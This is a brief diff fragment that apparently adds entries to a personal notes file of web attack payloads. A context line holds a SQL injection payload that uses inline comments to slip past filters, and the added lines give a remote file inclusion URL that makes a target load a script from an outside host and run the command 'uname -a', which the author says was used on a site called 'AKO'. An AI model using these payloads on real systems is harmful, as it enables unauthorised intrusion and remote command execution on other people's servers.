@@ -9,3 +9,8 @@ Or
 ----
 /?id=1/*union*/union/*select*/select+1,2,3/*
 ----
+
+on AKO I used the following
+----
+https://yourvsip/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
+----
